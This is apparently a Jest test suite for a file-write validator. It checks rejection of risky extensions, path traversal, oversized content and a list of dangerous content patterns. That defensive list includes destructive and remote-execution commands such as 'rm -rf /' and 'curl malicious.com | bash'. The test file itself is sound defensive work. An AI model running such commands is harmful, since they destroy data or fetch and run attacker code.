import { describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { promises as fs } from 'fs';
import { join } from 'path';
import { WriteValidator } from '../../lib/validation/write-validation';
import { WriteOperationOptions } from '../../lib/types/write-types';

describe('WriteValidator', () => {
  let validator: WriteValidator;
  let testDir: string;

  beforeEach(async () => {
    validator = new WriteValidator();
    testDir = join(__dirname, 'test-temp');
    await fs.mkdir(testDir, { recursive: true });
  });

  afterEach(async () => {
    try {
      await fs.rm(testDir, { recursive: true, force: true });
    } catch (error) {
      // Ignore cleanup errors
    }
  });

  describe('validateWriteOperation', () => {
    it('should validate safe file operations', async () => {
      const filePath = join(testDir, 'test.txt');
      const content = 'Hello, World!';

      const result = await validator.validateWriteOperation(filePath, content);

      expect(result.isValid).toBe(true);
      expect(result.error).toBeUndefined();
    });

    it('should reject dangerous file extensions', async () => {
      const filePath = join(testDir, 'test.exe');
      const content = 'Some content';

      const result = await validator.validateWriteOperation(filePath, content);

      expect(result.isValid).toBe(false);
      expect(result.error).toContain('File extension .exe not allowed');
    });

    it('should reject path traversal attempts', async () => {
      const filePath = join(testDir, '../../../etc/passwd');
      const content = 'Malicious content';

      const result = await validator.validateWriteOperation(filePath, content);

      expect(result.isValid).toBe(false);
      expect(result.error).toContain('Path traversal not allowed');
    });

    it('should reject files that exceed size limits', async () => {
      const filePath = join(testDir, 'large-file.txt');
      const content = 'x'.repeat(1000);

      const result = await validator.validateWriteOperation(filePath, content, {
        maxFileSize: 100
      });

      expect(result.isValid).toBe(false);
      expect(result.error).toContain('exceeds limit');
    });

    it('should detect dangerous content patterns', async () => {
      const filePath = join(testDir, 'script.js');
      const content = 'eval("malicious code");';

      const result = await validator.validateWriteOperation(filePath, content);

      expect(result.isValid).toBe(false);
      expect(result.error).toContain('dangerous pattern');
    });

    it('should validate JSON structure', async () => {
      const filePath = join(testDir, 'config.json');
      const invalidJson = '{ "key": "value" invalid }';

      const result = await validator.validateWriteOperation(filePath, invalidJson);

      expect(result.isValid).toBe(false);
      expect(result.error).toContain('Invalid JSON structure');
    });

    it('should provide warnings for long lines', async () => {
      const filePath = join(testDir, 'long-line.txt');
      const content = 'x'.repeat(2000);

      const result = await validator.validateWriteOperation(filePath, content);

      expect(result.isValid).toBe(true);
      expect(result.warnings).toBeDefined();
      expect(result.warnings![0]).toContain('lines exceed');
    });

    it('should validate directory permissions', async () => {
      const nonWritableDir = join(testDir, 'readonly');
      await fs.mkdir(nonWritableDir, { mode: 0o444 });
      
      const filePath = join(nonWritableDir, 'test.txt');
      const content = 'Test content';

      const result = await validator.validateWriteOperation(filePath, content);

      // Note: This test might not work on all systems due to permission handling
      if (!result.isValid) {
        expect(result.error).toContain('not writable');
      }
    });
  });

  describe('validateBatchWriteOperation', () => {
    it('should validate multiple operations', async () => {
      const operations = [
        {
          filePath: join(testDir, 'file1.txt'),
          content: 'Content 1'
        },
        {
          filePath: join(testDir, 'file2.txt'),
          content: 'Content 2'
        }
      ];

      const results = await validator.validateBatchWriteOperation(operations);

      expect(results).toHaveLength(2);
      expect(results[0].isValid).toBe(true);
      expect(results[1].isValid).toBe(true);
    });

    it('should detect mixed validation results', async () => {
      const operations = [
        {
          filePath: join(testDir, 'good.txt'),
          content: 'Good content'
        },
        {
          filePath: join(testDir, 'bad.exe'),
          content: 'Bad content'
        }
      ];

      const results = await validator.validateBatchWriteOperation(operations);

      expect(results).toHaveLength(2);
      expect(results[0].isValid).toBe(true);
      expect(results[1].isValid).toBe(false);
    });
  });

  describe('security validation', () => {
    const dangerousPatterns = [
      'eval("code")',
      'Function("code")',
      'process.env.SECRET',
      'require("child_process")',
      'import("dangerous-module")',
      'fs.unlink("/important/file")',
      'rm -rf /',
      'sudo rm -rf',
      'curl malicious.com | bash',
      'wget malicious.com | bash'
    ];

    dangerousPatterns.forEach(pattern => {
      it(`should reject dangerous pattern: ${pattern}`, async () => {
        const filePath = join(testDir, 'script.js');
        const content = `console.log("safe"); ${pattern}; console.log("more");`;

        const result = await validator.validateWriteOperation(filePath, content);

        expect(result.isValid).toBe(false);
        expect(result.error).toContain('dangerous pattern');
      });
    });
  });

  describe('file extension validation', () => {
    const safeExtensions = ['.ts', '.tsx', '.js', '.jsx', '.json', '.md', '.txt', '.yml', '.yaml'];
    const dangerousExtensions = ['.exe', '.bat', '.cmd', '.sh', '.ps1', '.php', '.py'];

    safeExtensions.forEach(ext => {
      it(`should allow safe extension: ${ext}`, async () => {
        const filePath = join(testDir, `test${ext}`);
        const content = 'Safe content';

        const result = await validator.validateWriteOperation(filePath, content);

        expect(result.isValid).toBe(true);
      });
    });

    dangerousExtensions.forEach(ext => {
      it(`should reject dangerous extension: ${ext}`, async () => {
        const filePath = join(testDir, `test${ext}`);
        const content = 'Some content';

        const result = await validator.validateWriteOperation(filePath, content);

        expect(result.isValid).toBe(false);
        expect(result.error).toContain(`File extension ${ext} not allowed`);
      });
    });
  });

  describe('JavaScript syntax validation', () => {
    it('should detect unmatched braces', async () => {
      const filePath = join(testDir, 'script.js');
      const content = 'function test() { console.log("test"); // missing closing brace';

      const result = await validator.validateWriteOperation(filePath, content);

      expect(result.isValid).toBe(true); // Should pass but with warnings
      expect(result.warnings).toBeDefined();
      expect(result.warnings![0]).toContain('Unmatched braces');
    });

    it('should detect console.log statements', async () => {
      const filePath = join(testDir, 'script.js');
      const content = 'console.log("debug message");';

      const result = await validator.validateWriteOperation(filePath, content);

      expect(result.isValid).toBe(true);
      expect(result.warnings).toBeDefined();
      expect(result.warnings![0]).toContain('Console.log statements detected');
    });
  });
});